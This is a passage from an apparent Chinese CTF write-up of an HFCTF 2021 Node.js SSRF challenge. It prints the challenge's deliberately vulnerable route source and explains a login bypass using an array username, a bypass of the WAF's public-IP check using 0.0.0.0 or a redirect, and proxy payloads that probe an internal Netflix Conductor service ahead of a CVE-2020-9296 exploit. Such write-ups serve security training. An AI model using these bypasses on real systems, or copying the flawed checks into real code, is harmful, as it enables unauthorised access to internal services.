class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = express.Router()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isIp = <span class="built_in">require</span>(<span class="string">&#x27;is-ip&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> IP = <span class="built_in">require</span>(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UrlParse = <span class="built_in">require</span>(<span class="string">&#x27;url-parse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;sha256, hint&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.env.PORT || <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatResopnse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(response) !== <span class="keyword">typeof</span>(<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(response)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OTHER_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] </span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">        req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">admin</span>: req.session.admin&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> status = WAF_LISTS.map(<span class="function">(<span class="params">waf</span>)=&gt;</span>waf(url)).reduce(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a&amp;&amp;b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!status) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;base&#x27;</span>, &#123;<span class="attr">title</span>: <span class="string">&#x27;WAF&#x27;</span>, <span class="attr">content</span>: <span class="string">&quot;Here is the waf...&quot;</span>&#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, response.data)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, error.message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line">router.post(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// test url</span></span><br><span class="line">    <span class="comment">// not implemented here</span></span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">&quot;https://postman-echo.com/post&quot;</span></span><br><span class="line">    <span class="keyword">await</span> axios.post(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">    res.render(<span class="string">&#x27;base&#x27;</span>, <span class="string">&quot;Something needs to be implemented&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;You can only use proxy to aceess here!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> result = &#123;<span class="attr">title</span>: <span class="string">&#x27;Search Success&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> method = req.method.toLowerCase()</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url)</span><br><span class="line">    <span class="keyword">const</span> data = req.body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(method == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(url)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(method == <span class="string">&#x27;post&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.post(url, data)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">            result.content = <span class="string">&#x27;Unsupported Method&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">        result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">        result.content = error.message</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;route.js&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure><p>查看 <code>login</code> 方法，也就是要满足以下条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.session.admin = hash === adminHash</span><br></pre></td></tr></table></figure><p>其中我们传入的为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br></pre></td></tr></table></figure><p>然后见代码 13 和 15行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br></pre></td></tr></table></figure><p>也就是说，用户名和密码都要是 admin 但是，，他们长度和内容不一样  = =，好，非常好，还好 js 有的特性和 PHP 有点类似，<code>username</code> 用数组即可绕过</p><p><img src="/img/2021hfctf/image-20210403192049950.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192049950.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192049950"></p><p><img src="/img/2021hfctf/image-20210403192514722.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192514722.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192514722"></p><p>登录成功后，我们要想办法访问 <code>/flag</code> 接口，不过必须为内网 ip</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>代码里提供 <code>/proxy</code> 接口可以代理访问，然后这个接口是本机访问的，所以可以跳过这个限制</p><p>绕过点1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你传入的要是ip，，不能是域名，而且，ip必须是公网ip，其实这个好办，整个公网服务器，然后</p><p>写入代码重定向即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>至于为啥在这里写 <code>/flag</code> 是因为内部代理请求不会触发这个waf 机制</p><p>绕过点2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造一下</p><p><img src="/img/2021hfctf/image-20210403192837797.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192837797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192837797"></p><p>即可得到提示，</p><p>大概意思是他们在内网部署了 netflix conductor 服务器，让我们 SSRF 一下，这里熟悉 docker 的 <a href="https://guo.moe/">果果</a> 同学跟我说题目都是 docker 搭建的，会不会，，这个 netflix 服务也是 docker 来的呢？</p><p><img src="/img/2021hfctf/image-20210403193312651.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193312651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193312651"></p><p><img src="/img/2021hfctf/image-20210403193452042.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193452042.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193452042"></p><p>膜拜.jpg ，至于为什么知道是 8080 端口，搜一下 netflix 官方部署文档，就 8080 和 5000 两个端口。</p><p>当然，这里还有小差曲，我一开始暴力破解，，内网ip 和 端口，直接把它给弄宕机了。。。</p><p>源码有点长，提取关键部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.swaggerUi = <span class="keyword">new</span> SwaggerUi(&#123;</span><br><span class="line">                  <span class="attr">url</span>: url + <span class="string">&quot;/api/swagger.json&quot;</span>,</span><br><span class="line">                  <span class="attr">dom_id</span>: <span class="string">&quot;swagger-ui-container&quot;</span>,</span><br><span class="line">                  <span class="attr">supportedSubmitMethods</span>: [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>],</span><br><span class="line">                  <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params">swaggerApi, swaggerUi</span>)</span>&#123;</span><br><span class="line">                      <span class="built_in">window</span>.swaggerUi.api.setBasePath(<span class="string">&quot;/api&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span>(<span class="keyword">typeof</span> initOAuth == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                          initOAuth(&#123;</span><br><span class="line">                              <span class="attr">clientId</span>: <span class="string">&quot;your-client-id&quot;</span>,</span><br><span class="line">                              <span class="attr">clientSecret</span>: <span class="string">&quot;your-client-secret-if-required&quot;</span>,</span><br><span class="line">                              <span class="attr">realm</span>: <span class="string">&quot;your-realms&quot;</span>,</span><br><span class="line">                              <span class="attr">appName</span>: <span class="string">&quot;your-app-name&quot;</span>,</span><br><span class="line">                              <span class="attr">scopeSeparator</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">                              <span class="attr">additionalQueryStringParams</span>: &#123;&#125;</span><br><span class="line">                          &#125;);</span><br><span class="line">                      &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>访问这个 json 文件</p><p><img src="/img/2021hfctf/image-20210403193726603.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193726603.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193726603"></p><p>然后到这就卡住了</p><p>网上搜了一下 CVE， <a href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> 毕竟  SSRF 常见都是和 Redis 之类的的，一般都是公开漏洞，然后接口好像也可以正常访问</p><p><img src="/img/2021hfctf/image-20210403193837506.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193837506.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193837506"></p><p>正打算看看能不能 CRLF 啥的，看看能不能发送 POST 请求过去利用 CVE，但突然就访问不了了，，，</p><p><img src="/img/2021hfctf/image-20210403193944899.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193944899.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193944899"></p><p>不知道思路是不是跑偏了，然后被举办方给看到了 ，就直接卡了，然后就没啥时间了，也没来得及试其他的，坐等 wp，我很好奇.jpg</p><hr><p>4月22日更</p><p>好了，原来思路没有跑偏，我们继续（刚肝完论文</p><p>不过在 buu 的复现环境里直接给出了netflix 的内网ip，不用我们猜docker网段然后爆破，我们直接fuzz下图3个网段 8080端口即可</p><p><img src="/img/2021hfctf/image-20210422145443361.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422145443361.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422145443361"></p><p>最近刷了一些SSRF题，发现还可以用 0.0.0.0 的方式去绕过 IP 限制，访问 0.0.0.0 默认是解析到本机上的，然后恰好 nodejs 的 <code>IP.isPublic(host)</code> 函数会把他视为公网IP。</p><p>注意fuzz线程不能太高，不然服务容易崩，最终发现netflix在 10.0.219.14:8080</p><p><img src="/img/2021hfctf/image-20210422160555844.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422160555844.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422160555844"></p><p>现在网上搜了一下，发现有多个的漏洞，所以先确认一下 netflix 的版本，</p><p>先请求一下根路径发现源码有中暴露的api路径 </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080</span><br></pre></td></tr></table></figure><p>请求一下会返回json格式内容</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/swagger.json</span><br></pre></td></tr></table></figure><p>复制json 格式化一下发现 admin config 就在第一处，，</p><p><img src="/img/2021hfctf/image-20210422152257725.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422152257725.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422152257725"></p><p>请求一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/admin/config</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210422153043013.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422153043013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422153043013"></p><p>发现 netflix 版本为 2.26.0，网上查了下，只发现 <a href="https://snyk.io/vuln/maven:com.netflix.conductor%3Aconductor-core">2.25.3</a> 版本的漏洞</p><p>看了一下 <a href="https://github.com/Netflix/conductor/pull/1543/commits/375f8d8b708a801647c327e0848b30d34f804edd">commit</a> 记录，发现这个版本已经修了的</p><p><img src="/img/2021hfctf/image-20210422153724132.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422153724132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422153724132"></p><p>看了一下大佬的复现，发现思路是对了，CRLF POST 利用 netflix 的 CVE</p><p><a href="https://xz.aliyun.com/t/9423">https://xz.aliyun.com/t/9423</a></p><p><a href="https://www.zhaoj.in/read-6905.html">https://www.zhaoj.in/read-6905.html</a></p><p>经过这次比赛，发现，有时候版本不对就先试试临近版本，看看能不能死马当活马医 （</p><p>首先要复现 CVE-2020-9296，先保证在本地能正常利用。</p><h3 id="CVE-2020-9296-复现"><a href="#CVE-2020-9296-复现" class="headerlink" title="CVE-2020-9296 复现"></a>CVE-2020-9296 复现</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" 